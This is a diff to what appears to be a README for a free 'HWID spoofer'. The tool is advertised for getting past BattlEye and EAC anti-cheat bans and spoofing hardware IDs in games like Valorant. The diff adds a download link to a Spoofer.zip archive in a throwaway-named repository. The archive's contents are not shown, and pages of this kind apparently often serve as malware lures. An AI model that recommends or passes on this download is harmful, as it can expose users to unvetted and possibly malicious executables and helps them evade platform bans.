@@ -2,7 +2,7 @@
 > Hwid Spoofer is your go-to tool to help you bypass bans from popular anti-cheat systems like BattlEye and EAC, change hardware IDs, and spoof your hardware information for various games. It's your solution to staying one step ahead in the gaming world! 👾
 
 
-# [Click To Download]()
+# [Click To Download](https://github.com/Hwid-Spoofer-Free-2025/hwid-spoofer/releases/download/Hwid-Spoofer/Spoofer.zip)
 
 # Supported games:
 - valorant
